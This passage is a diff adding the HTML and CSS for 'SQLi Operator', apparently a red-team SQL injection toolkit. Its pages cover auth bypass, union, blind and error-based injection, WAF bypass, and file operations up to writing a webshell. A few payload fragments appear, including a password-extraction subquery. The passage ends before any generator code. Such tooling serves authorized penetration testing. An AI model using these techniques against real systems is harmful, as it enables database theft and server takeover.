@@ -1,0 +1,3419 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQLi Operator — Red Team Toolkit</title>
+<style>
+:root {
+  --bg: #07090a;
+  --surface: #0d1117;
+  --surface2: #161b22;
+  --surface3: #21262d;
+  --border: #30363d;
+  --border2: #444c56;
+  --text: #e6edf3;
+  --text2: #8b949e;
+  --text3: #6e7681;
+  --green: #3fb950;
+  --green2: #238636;
+  --red: #f85149;
+  --amber: #e3b341;
+  --blue: #58a6ff;
+  --purple: #bc8cff;
+  --cyan: #79c0ff;
+  --accent: #1f6feb;
+  --mono: 'Cascadia Code','Fira Code','JetBrains Mono',Consolas,'Courier New',monospace;
+  --sans: -apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { height: 100%; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 13px;
+  height: 100%;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--surface); }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--text3); }
+
+/* ── HEADER ── */
+#header {
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 0 16px;
+  height: 48px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-shrink: 0;
+  z-index: 100;
+}
+#header .logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-family: var(--mono);
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: -0.3px;
+  color: var(--text);
+}
+#header .logo span.bracket { color: var(--red); }
+#header .logo span.word { color: var(--green); }
+#header .badge {
+  font-size: 10px;
+  background: rgba(248,81,73,.15);
+  color: var(--red);
+  border: 1px solid rgba(248,81,73,.3);
+  border-radius: 4px;
+  padding: 2px 6px;
+  font-family: var(--mono);
+  letter-spacing: 1px;
+}
+#search-global {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 12px;
+  padding: 6px 12px;
+  width: 260px;
+  outline: none;
+  transition: border-color .15s;
+}
+#search-global:focus { border-color: var(--accent); }
+#search-global::placeholder { color: var(--text3); }
+
+/* ── LAYOUT ── */
+#app {
+  display: flex;
+  flex: 1;
+  overflow: hidden;
+}
+
+/* ── SIDEBAR ── */
+#sidebar {
+  width: 210px;
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  flex-shrink: 0;
+  padding: 8px 0;
+}
+.nav-group { margin-bottom: 4px; }
+.nav-group-label {
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 1.2px;
+  color: var(--text3);
+  padding: 8px 16px 4px;
+  text-transform: uppercase;
+}
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 7px 16px;
+  cursor: pointer;
+  color: var(--text2);
+  font-size: 12.5px;
+  transition: background .1s, color .1s;
+  border-left: 2px solid transparent;
+  user-select: none;
+}
+.nav-item:hover { background: var(--surface2); color: var(--text); }
+.nav-item.active {
+  background: rgba(31,111,235,.12);
+  color: var(--blue);
+  border-left-color: var(--blue);
+}
+.nav-item .icon { font-size: 14px; width: 16px; text-align: center; }
+.nav-sep { height: 1px; background: var(--border); margin: 6px 0; }
+
+/* ── MAIN ── */
+#main {
+  flex: 1;
+  overflow-y: auto;
+  padding: 20px 24px;
+}
+.page { display: none; }
+.page.active { display: block; }
+
+/* ── SECTION HEADER ── */
+.section-header {
+  margin-bottom: 20px;
+}
+.section-header h1 {
+  font-size: 20px;
+  font-weight: 600;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.section-header p {
+  color: var(--text2);
+  margin-top: 4px;
+  font-size: 13px;
+  line-height: 1.5;
+}
+
+/* ── CARDS ── */
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin-bottom: 12px;
+  overflow: hidden;
+}
+.card-header {
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border);
+  padding: 10px 14px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 8px;
+}
+.card-title {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text);
+  font-family: var(--mono);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.card-body { padding: 14px; }
+.card-body.no-pad { padding: 0; }
+
+/* ── PAYLOAD ITEM ── */
+.payload-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 8px 10px;
+  border-radius: 5px;
+  transition: background .1s;
+  margin-bottom: 2px;
+}
+.payload-item:hover { background: var(--surface2); }
+.payload-code {
+  flex: 1;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--green);
+  line-height: 1.5;
+  word-break: break-all;
+  cursor: text;
+  user-select: all;
+}
+.payload-desc {
+  font-size: 11px;
+  color: var(--text3);
+  margin-top: 2px;
+  font-family: var(--sans);
+}
+.payload-actions { display: flex; gap: 4px; flex-shrink: 0; }
+
+/* ── BUTTONS ── */
+.btn {
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  font-size: 11px;
+  font-weight: 500;
+  padding: 5px 10px;
+  transition: all .15s;
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  font-family: var(--sans);
+}
+.btn-copy {
+  background: var(--surface3);
+  color: var(--text2);
+  border: 1px solid var(--border);
+}
+.btn-copy:hover { background: var(--border); color: var(--text); }
+.btn-copy.copied { background: rgba(63,185,80,.15); color: var(--green); border-color: var(--green2); }
+.btn-primary {
+  background: var(--accent);
+  color: #fff;
+  padding: 7px 14px;
+  font-size: 12px;
+}
+.btn-primary:hover { background: #388bfd; }
+.btn-green {
+  background: var(--green2);
+  color: #fff;
+  padding: 7px 14px;
+  font-size: 12px;
+}
+.btn-green:hover { background: #2ea043; }
+.btn-danger {
+  background: rgba(248,81,73,.15);
+  color: var(--red);
+  border: 1px solid rgba(248,81,73,.3);
+  padding: 6px 12px;
+}
+.btn-danger:hover { background: rgba(248,81,73,.25); }
+.btn-outline {
+  background: transparent;
+  color: var(--text2);
+  border: 1px solid var(--border);
+  padding: 6px 12px;
+}
+.btn-outline:hover { border-color: var(--border2); color: var(--text); }
+
+/* ── INPUTS ── */
+.input, .select, .textarea {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 12px;
+  padding: 7px 10px;
+  outline: none;
+  transition: border-color .15s;
+  width: 100%;
+}
+.input:focus, .select:focus, .textarea:focus { border-color: var(--accent); }
+.input::placeholder, .textarea::placeholder { color: var(--text3); }
+.select { cursor: pointer; }
+.select option { background: var(--surface2); }
+.textarea { resize: vertical; min-height: 80px; line-height: 1.5; }
+.label {
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--text2);
+  margin-bottom: 4px;
+  text-transform: uppercase;
+  letter-spacing: .5px;
+}
+.form-row { margin-bottom: 12px; }
+.form-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+}
+.form-grid-3 { grid-template-columns: 1fr 1fr 1fr; }
+
+/* ── TAGS / BADGES ── */
+.tag {
+  display: inline-flex;
+  align-items: center;
+  border-radius: 4px;
+  padding: 2px 7px;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: .3px;
+  font-family: var(--mono);
+}
+.tag-green { background: rgba(63,185,80,.15); color: var(--green); }
+.tag-red { background: rgba(248,81,73,.15); color: var(--red); }
+.tag-blue { background: rgba(88,166,255,.15); color: var(--blue); }
+.tag-amber { background: rgba(227,179,65,.15); color: var(--amber); }
+.tag-purple { background: rgba(188,140,255,.15); color: var(--purple); }
+.tag-cyan { background: rgba(121,192,255,.15); color: var(--cyan); }
+
+/* ── STEPS ── */
+.step-list { counter-reset: step; }
+.step {
+  display: flex;
+  gap: 12px;
+  margin-bottom: 16px;
+  align-items: flex-start;
+}
+.step-num {
+  counter-increment: step;
+  width: 26px;
+  height: 26px;
+  border-radius: 50%;
+  background: var(--surface3);
+  border: 1px solid var(--border2);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 11px;
+  font-weight: 700;
+  color: var(--amber);
+  flex-shrink: 0;
+  font-family: var(--mono);
+}
+.step-content { flex: 1; }
+.step-title {
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text);
+  margin-bottom: 4px;
+}
+.step-body { color: var(--text2); font-size: 12px; line-height: 1.6; }
+
+/* ── TABS ── */
+.tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border); margin-bottom: 16px; }
+.tab {
+  padding: 8px 16px;
+  font-size: 12px;
+  cursor: pointer;
+  color: var(--text2);
+  border-bottom: 2px solid transparent;
+  transition: all .15s;
+  font-weight: 500;
+  user-select: none;
+}
+.tab:hover { color: var(--text); }
+.tab.active { color: var(--blue); border-bottom-color: var(--blue); }
+
+/* ── GRID LAYOUT ── */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
+
+/* ── NOTIFICATION ── */
+#notif-container { position: fixed; top: 58px; right: 16px; z-index: 9999; display: flex; flex-direction: column; gap: 6px; }
+.notif {
+  padding: 10px 16px;
+  border-radius: 6px;
+  font-size: 12px;
+  font-weight: 500;
+  animation: notif-in .2s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  min-width: 200px;
+  border: 1px solid;
+}
+.notif-success { background: rgba(63,185,80,.15); color: var(--green); border-color: var(--green2); }
+.notif-error { background: rgba(248,81,73,.12); color: var(--red); border-color: rgba(248,81,73,.3); }
+.notif-info { background: rgba(31,111,235,.12); color: var(--blue); border-color: rgba(31,111,235,.3); }
+@keyframes notif-in { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+/* ── CODE BLOCK ── */
+.code-block {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px 14px;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--green);
+  line-height: 1.6;
+  word-break: break-all;
+  position: relative;
+}
+.code-block .copy-float {
+  position: absolute;
+  top: 6px;
+  right: 6px;
+}
+
+/* ── GENERATED OUTPUT ── */
+#gen-output { margin-top: 14px; }
+.gen-payload-list { display: flex; flex-direction: column; gap: 2px; }
+
+/* ── INFO BOX ── */
+.info-box {
+  background: rgba(88,166,255,.08);
+  border: 1px solid rgba(88,166,255,.2);
+  border-radius: 6px;
+  padding: 10px 14px;
+  font-size: 12px;
+  color: var(--text2);
+  line-height: 1.6;
+  margin-bottom: 12px;
+}
+.info-box.warn {
+  background: rgba(227,179,65,.08);
+  border-color: rgba(227,179,65,.2);
+  color: var(--amber);
+}
+.info-box.danger {
+  background: rgba(248,81,73,.08);
+  border-color: rgba(248,81,73,.2);
+  color: var(--red);
+}
+.info-box strong { color: var(--text); }
+
+/* ── WIZARD ── */
+#wizard-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,.7);
+  z-index: 500;
+  align-items: center;
+  justify-content: center;
+}
+#wizard-overlay.open { display: flex; }
+#wizard-modal {
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  border-radius: 10px;
+  width: 640px;
+  max-height: 80vh;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+#wizard-header {
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border);
+  padding: 14px 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+#wizard-title { font-size: 15px; font-weight: 600; }
+#wizard-close { background: none; border: none; color: var(--text2); cursor: pointer; font-size: 18px; line-height: 1; }
+#wizard-close:hover { color: var(--text); }
+#wizard-progress {
+  padding: 10px 18px;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  gap: 4px;
+}
+.wiz-dot {
+  height: 4px;
+  flex: 1;
+  background: var(--border);
+  border-radius: 2px;
+  transition: background .2s;
+}
+.wiz-dot.done { background: var(--green2); }
+.wiz-dot.active { background: var(--blue); }
+#wizard-body { flex: 1; overflow-y: auto; padding: 18px; }
+#wizard-footer {
+  border-top: 1px solid var(--border);
+  padding: 12px 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+#wizard-step-counter { font-size: 11px; color: var(--text3); font-family: var(--mono); }
+.wiz-step { display: none; }
+.wiz-step.active { display: block; }
+.wiz-step-title { font-size: 15px; font-weight: 600; margin-bottom: 6px; }
+.wiz-step-desc { color: var(--text2); font-size: 12.5px; line-height: 1.6; margin-bottom: 14px; }
+.wiz-explain {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 10px 14px;
+  font-size: 12px;
+  color: var(--text2);
+  line-height: 1.6;
+  margin-top: 12px;
+}
+.wiz-explain summary { cursor: pointer; color: var(--amber); font-weight: 600; outline: none; }
+
+/* ── ENCODER ── */
+.enc-io { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; align-items: start; }
+.enc-output {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 8px 10px;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--cyan);
+  min-height: 60px;
+  word-break: break-all;
+  line-height: 1.6;
+  position: relative;
+}
+.enc-arrow {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--text3);
+  font-size: 18px;
+  padding-top: 22px;
+}
+
+/* ── PAYLOAD SEARCH ── */
+.search-results-count { font-size: 11px; color: var(--text3); margin-bottom: 8px; font-family: var(--mono); }
+.highlight { background: rgba(227,179,65,.25); color: var(--amber); border-radius: 2px; padding: 0 1px; }
+
+/* ── QUERY BUILDER ── */
+.qb-output {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px 14px;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--green);
+  line-height: 1.7;
+  margin-top: 14px;
+  word-break: break-all;
+  min-height: 50px;
+}
+
+/* ── BYPASS TRANSFORMER ── */
+.bypass-chip {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 11px;
+  background: var(--surface3);
+  border: 1px solid var(--border);
+  cursor: pointer;
+  color: var(--text2);
+  transition: all .15s;
+  margin: 2px;
+  font-family: var(--mono);
+}
+.bypass-chip:hover { border-color: var(--border2); color: var(--text); }
+.bypass-chip.active { background: rgba(31,111,235,.15); border-color: var(--accent); color: var(--blue); }
+
+/* ── DIVIDER ── */
+.divider { height: 1px; background: var(--border); margin: 16px 0; }
+
+/* ── RESPONSIVE ── */
+@media (max-width: 900px) {
+  #sidebar { width: 46px; }
+  .nav-item span.nav-label { display: none; }
+  .nav-group-label { display: none; }
+  .form-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div id="header">
+  <div class="logo">
+    <span class="bracket">[</span>
+    <span class="word">SQLi</span>
+    <span>Operator</span>
+    <span class="bracket">]</span>
+    <span class="badge">AUTHORIZED USE ONLY</span>
+  </div>
+  <input type="text" id="search-global" placeholder="⌕ Search payloads... (Ctrl+K)" spellcheck="false">
+</div>
+
+<div id="app">
+  <!-- SIDEBAR -->
+  <nav id="sidebar">
+    <div class="nav-group">
+      <div class="nav-group-label">Inject</div>
+      <div class="nav-item active" onclick="nav('wizard-hub')"><span class="icon">🧭</span><span class="nav-label">Attack Wizard</span></div>
+      <div class="nav-item" onclick="nav('auth-bypass')"><span class="icon">🔓</span><span class="nav-label">Auth Bypass</span></div>
+      <div class="nav-item" onclick="nav('union-inject')"><span class="icon">⚡</span><span class="nav-label">Union Injection</span></div>
+      <div class="nav-item" onclick="nav('blind-inject')"><span class="icon">👁</span><span class="nav-label">Blind SQLi</span></div>
+      <div class="nav-item" onclick="nav('error-inject')"><span class="icon">💥</span><span class="nav-label">Error-Based</span></div>
+    </div>
+    <div class="nav-sep"></div>
+    <div class="nav-group">
+      <div class="nav-group-label">Enumerate</div>
+      <div class="nav-item" onclick="nav('enum-builder')"><span class="icon">🗄</span><span class="nav-label">Query Builder</span></div>
+      <div class="nav-item" onclick="nav('file-ops')"><span class="icon">📁</span><span class="nav-label">File Ops</span></div>
+      <div class="nav-item" onclick="nav('privesc')"><span class="icon">🔑</span><span class="nav-label">Privileges</span></div>
+    </div>
+    <div class="nav-sep"></div>
+    <div class="nav-group">
+      <div class="nav-group-label">Tools</div>
+      <div class="nav-item" onclick="nav('waf-bypass')"><span class="icon">🛡</span><span class="nav-label">WAF Bypass</span></div>
+      <div class="nav-item" onclick="nav('encoder')"><span class="icon">🔤</span><span class="nav-label">Encoder</span></div>
+      <div class="nav-item" onclick="nav('payload-lib')"><span class="icon">📚</span><span class="nav-label">Payload Library</span></div>
+      <div class="nav-item" onclick="nav('reference')"><span class="icon">📖</span><span class="nav-label">Reference</span></div>
+    </div>
+    <div class="nav-sep"></div>
+    <div class="nav-group">
+      <div class="nav-group-label">External</div>
+      <div class="nav-item" onclick="nav('ext-sources')"><span class="icon">🌐</span><span class="nav-label">Live Sources</span></div>
+      <div class="nav-item" onclick="nav('portswigger')"><span class="icon">🔬</span><span class="nav-label">PortSwigger Map</span></div>
+      <div class="nav-item" onclick="nav('advanced')"><span class="icon">🧬</span><span class="nav-label">Advanced Techniques</span></div>
+    </div>
+  </nav>
+
+  <!-- MAIN -->
+  <div id="main">
+
+    <!-- ══════════════════════════════════════ ATTACK WIZARD HUB -->
+    <div class="page active" id="page-wizard-hub">
+      <div class="section-header">
+        <h1>🧭 Attack Wizard</h1>
+        <p>Context-aware guided attack paths. Select your scenario and follow the steps.</p>
+      </div>
+
+      <div class="info-box">
+        <strong>How to use:</strong> Identify your injection type, pick the matching wizard, and follow each step. Every step generates context-specific payloads you can copy directly into your target.
+      </div>
+
+      <div class="grid-2">
+        <div class="card" style="cursor:pointer" onclick="openWizard('union')">
+          <div class="card-header">
+            <div class="card-title"><span>⚡</span> Union Injection Wizard</div>
+            <span class="tag tag-green">RECOMMENDED</span>
+          </div>
+          <div class="card-body">
+            <p style="color:var(--text2);font-size:12px;line-height:1.6">Full guided flow: column detection → identify visible columns → DB fingerprint → schema enumeration → data extraction. Best when you see query output on page.</p>
+            <div style="margin-top:10px;display:flex;gap:6px">
+              <span class="tag tag-blue">in-band</span>
+              <span class="tag tag-cyan">visible output</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="cursor:pointer" onclick="openWizard('blind-bool')">
+          <div class="card-header">
+            <div class="card-title"><span>👁</span> Boolean Blind Wizard</div>
+          </div>
+          <div class="card-body">
+            <p style="color:var(--text2);font-size:12px;line-height:1.6">Extract data character-by-character when only true/false page differences are visible. Generates SUBSTRING/ASCII payloads for systematic extraction.</p>
+            <div style="margin-top:10px;display:flex;gap:6px">
+              <span class="tag tag-amber">blind</span>
+              <span class="tag tag-amber">page diff</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="cursor:pointer" onclick="openWizard('blind-time')">
+          <div class="card-header">
+            <div class="card-title"><span>⏱</span> Time-Based Blind Wizard</div>
+          </div>
+          <div class="card-body">
+            <p style="color:var(--text2);font-size:12px;line-height:1.6">Use sleep-based conditionals to extract data when no page difference is visible. For each DBMS: MySQL SLEEP, PostgreSQL pg_sleep, MSSQL WAITFOR.</p>
+            <div style="margin-top:10px;display:flex;gap:6px">
+              <span class="tag tag-amber">blind</span>
+              <span class="tag tag-red">latency</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="cursor:pointer" onclick="openWizard('auth')">
+          <div class="card-header">
+            <div class="card-title"><span>🔓</span> Auth Bypass Wizard</div>
+          </div>
+          <div class="card-body">
+            <p style="color:var(--text2);font-size:12px;line-height:1.6">Step-by-step login bypass methodology. Tests quote injection, OR operator subversion, comment truncation, and parenthesis closing techniques.</p>
+            <div style="margin-top:10px;display:flex;gap:6px">
+              <span class="tag tag-purple">auth</span>
+              <span class="tag tag-green">login</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="cursor:pointer" onclick="openWizard('error')">
+          <div class="card-header">
+            <div class="card-title"><span>💥</span> Error-Based Wizard</div>
+          </div>
+          <div class="card-body">
+            <p style="color:var(--text2);font-size:12px;line-height:1.6">Exploit verbose SQL errors to extract data. Uses EXTRACTVALUE, UPDATEXML for MySQL and type-cast errors for PostgreSQL/MSSQL/Oracle.</p>
+            <div style="margin-top:10px;display:flex;gap:6px">
+              <span class="tag tag-red">errors</span>
+              <span class="tag tag-blue">verbose</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="cursor:pointer" onclick="openWizard('file')">
+          <div class="card-header">
+            <div class="card-title"><span>📁</span> File Ops Wizard</div>
+          </div>
+          <div class="card-body">
+            <p style="color:var(--text2);font-size:12px;line-height:1.6">Check privileges → verify secure_file_priv → read sensitive files → write webshell. Full privilege verification before exploitation.</p>
+            <div style="margin-top:10px;display:flex;gap:6px">
+              <span class="tag tag-red">RCE</span>
+              <span class="tag tag-amber">FILE priv</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+      <div class="section-header">
+        <h1 style="font-size:15px">🔍 Quick Discovery Payloads</h1>
+      </div>
+      <div class="card">
+        <div class="card-body">
+          <p class="label" style="margin-bottom:8px">Test these first to identify injection and DBMS type</p>
+          <div id="discovery-payloads"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════ AUTH BYPASS -->
+    <div class="page" id="page-auth-bypass">
+      <div class="section-header">
+        <h1>🔓 Authentication Bypass</h1>
+        <p>Generate custom auth bypass payloads based on your injection context.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-header"><div class="card-title">⚙ Payload Generator</div></div>
+        <div class="card-body">
+          <div class="form-grid">
+            <div class="form-row">
+              <div class="label">Injection Field</div>
+              <select class="select" id="auth-field">
+                <option value="username">Username field</option>
+                <option value="password">Password field</option>
+                <option value="both">Both fields</option>
+              </select>
+            </div>
+            <div class="form-row">
+              <div class="label">SQL Context</div>
+              <select class="select" id="auth-context">
+                <option value="string">String (quoted)</option>
+                <option value="numeric">Numeric (unquoted)</option>
+                <option value="string-paren">String + parenthesis</option>
+              </select>
+            </div>
+            <div class="form-row">
+              <div class="label">Known Username (optional)</div>
+              <input type="text" class="input" id="auth-username" placeholder="admin" spellcheck="false">
+            </div>
+            <div class="form-row">
+              <div class="label">Comment Style</div>
+              <select class="select" id="auth-comment">
+                <option value="dashdash">-- - (MySQL)</option>
+                <option value="hash"># (MySQL)</option>
+                <option value="inline">/**/ (Inline)</option>
+              </select>
+            </div>
+          </div>
+          <button class="btn btn-primary" onclick="generateAuthPayloads()">Generate Payloads</button>
+        </div>
+      </div>
+
+      <div id="auth-output"></div>
+
+      <div class="divider"></div>
+      <div class="card">
+        <div class="card-header"><div class="card-title">📖 All Auth Bypass Payloads</div></div>
+        <div class="card-body no-pad" id="auth-all-payloads"></div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════ UNION INJECTION -->
+    <div class="page" id="page-union-inject">
+      <div class="section-header">
+        <h1>⚡ Union Injection</h1>
+        <p>Build union-based payloads step by step. Configure your environment below.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-header"><div class="card-title">⚙ Environment Config</div></div>
+        <div class="card-body">
+          <div class="form-grid form-grid-3">
+            <div class="form-row">
+              <div class="label">Prefix / Injection Point</div>
+              <input type="text" class="input" id="union-prefix" value="'" placeholder="' or 1 or &quot;" spellcheck="false">
+            </div>
+            <div class="form-row">
+              <div class="label">Comment Style</div>
+              <select class="select" id="union-comment">
+                <option value="-- -">-- - (MySQL)</option>
+                <option value="#"># (MySQL)</option>
+                <option value="/*">/* (inline)</option>
+              </select>
+            </div>
+            <div class="form-row">
+              <div class="label">Column Count</div>
+              <input type="number" class="input" id="union-cols" value="4" min="1" max="20">
+            </div>
+            <div class="form-row">
+              <div class="label">Visible Column Index (1-based)</div>
+              <input type="number" class="input" id="union-visible" value="2" min="1" max="20">
+            </div>
+            <div class="form-row">
+              <div class="label">Target Database Name</div>
+              <input type="text" class="input" id="union-db" placeholder="dev" spellcheck="false">
+            </div>
+            <div class="form-row">
+              <div class="label">Target Table Name</div>
+              <input type="text" class="input" id="union-table" placeholder="credentials" spellcheck="false">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tabs">
+        <div class="tab active" onclick="unionTab(this,'col-detection')">1. Column Detection</div>
+        <div class="tab" onclick="unionTab(this,'col-visible')">2. Find Visible Cols</div>
+        <div class="tab" onclick="unionTab(this,'fingerprint')">3. Fingerprint</div>
+        <div class="tab" onclick="unionTab(this,'schema-enum')">4. Schema Enum</div>
+        <div class="tab" onclick="unionTab(this,'data-extract')">5. Data Extraction</div>
+      </div>
+
+      <div id="union-tab-col-detection">
+        <div class="info-box">
+          <strong>ORDER BY method:</strong> Increment until the page returns an error or no results — the last successful number is your column count. Then confirm with UNION SELECT.
+        </div>
+        <div id="union-orderby-payloads"></div>
+        <div class="divider"></div>
+        <div class="info-box"><strong>UNION NULL method:</strong> Try with increasing NULLs until no error.</div>
+        <div id="union-null-payloads"></div>
+      </div>
+      <div id="union-tab-col-visible" style="display:none">
+        <div class="info-box"><strong>Goal:</strong> Identify which column positions are printed on screen. Replace numbers with markers — the ones visible on page are your injection points.</div>
+        <div id="union-visible-payloads"></div>
+      </div>
+      <div id="union-tab-fingerprint" style="display:none">
+        <div class="info-box"><strong>Goal:</strong> Confirm DBMS type and version before enumerating further. Each DBMS has different system tables.</div>
+        <div id="union-fingerprint-payloads"></div>
+      </div>
+      <div id="union-tab-schema-enum" style="display:none">
+        <div class="info-box"><strong>Flow:</strong> List databases → list tables in target DB → list columns in target table → extract data.</div>
+        <div id="union-schema-payloads"></div>
+      </div>
+      <div id="union-tab-data-extract" style="display:none">
+        <div class="form-row">
+          <div class="label">Columns to extract (comma-separated)</div>
+          <input type="text" class="input" id="union-extract-cols" placeholder="username, password" spellcheck="false">
+          <button class="btn btn-primary" style="margin-top:8px" onclick="buildExtractPayload()">Build Payload</button>
+        </div>
+        <div id="union-extract-output" style="margin-top:12px"></div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════ BLIND INJECT -->
+    <div class="page" id="page-blind-inject">
+      <div class="section-header">
+        <h1>👁 Blind SQL Injection</h1>
+        <p>Boolean-based and time-based blind injection payload generators with character extraction support.</p>
+      </div>
+
+      <div class="tabs">
+        <div class="tab active" onclick="blindTab(this,'boolean')">Boolean-Based</div>
+        <div class="tab" onclick="blindTab(this,'time')">Time-Based</div>
+        <div class="tab" onclick="blindTab(this,'extractor')">Char Extractor</div>
+      </div>
+
+      <div id="blind-tab-boolean">
+        <div class="card">
+          <div class="card-header"><div class="card-title">⚙ Boolean Generator</div></div>
+          <div class="card-body">
+            <div class="form-grid">
+              <div class="form-row">
+                <div class="label">Prefix</div>
+                <input type="text" class="input" id="bool-prefix" value="'" spellcheck="false">
+              </div>
+              <div class="form-row">
+                <div class="label">Comment</div>
+                <select class="select" id="bool-comment">
+                  <option value="-- -">-- -</option>
+                  <option value="#">#</option>
+                </select>
+              </div>
+              <div class="form-row">
+                <div class="label">Target Field</div>
+                <input type="text" class="input" id="bool-field" placeholder="username" spellcheck="false">
+              </div>
+              <div class="form-row">
+                <div class="label">Target Table</div>
+                <input type="text" class="input" id="bool-table" placeholder="users" spellcheck="false">
+              </div>
+            </div>
+            <button class="btn btn-primary" onclick="generateBoolPayloads()">Generate</button>
+          </div>
+        </div>
+        <div id="bool-output" style="margin-top:12px"></div>
+        <div class="divider"></div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">📖 Boolean Payload Library</div></div>
+          <div class="card-body no-pad" id="bool-lib"></div>
+        </div>
+      </div>
+
+      <div id="blind-tab-time" style="display:none">
+        <div class="card">
+          <div class="card-header"><div class="card-title">⚙ Time-Based Generator</div></div>
+          <div class="card-body">
+            <div class="form-grid">
+              <div class="form-row">
+                <div class="label">DBMS</div>
+                <select class="select" id="time-dbms">
+                  <option value="mysql">MySQL / MariaDB</option>
+                  <option value="pgsql">PostgreSQL</option>
+                  <option value="mssql">MSSQL</option>
+                  <option value="oracle">Oracle</option>
+                </select>
+              </div>
+              <div class="form-row">
+                <div class="label">Sleep Duration (seconds)</div>
+                <input type="number" class="input" id="time-sleep" value="5" min="1" max="30">
+              </div>
+              <div class="form-row">
+                <div class="label">Prefix</div>
+                <input type="text" class="input" id="time-prefix" value="'" spellcheck="false">
+              </div>
+              <div class="form-row">
+                <div class="label">Comment</div>
+                <select class="select" id="time-comment">
+                  <option value="-- -">-- -</option>
+                  <option value="#">#</option>
+                </select>
+              </div>
+            </div>
+            <button class="btn btn-primary" onclick="generateTimePayloads()">Generate</button>
+          </div>
+        </div>
+        <div id="time-output" style="margin-top:12px"></div>
+      </div>
+
+      <div id="blind-tab-extractor" style="display:none">
+        <div class="info-box">
+          <strong>Character Extractor:</strong> Generates SUBSTRING/ASCII payloads to extract data one character at a time. Use with Boolean or Time-based injection.
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">⚙ Extraction Config</div></div>
+          <div class="card-body">
+            <div class="form-grid">
+              <div class="form-row">
+                <div class="label">Extract From (subquery or field)</div>
+                <input type="text" class="input" id="ext-query" placeholder="SELECT password FROM users LIMIT 0,1" spellcheck="false">
+              </div>
+              <div class="form-row">
+                <div class="label">Method</div>
+                <select class="select" id="ext-method">
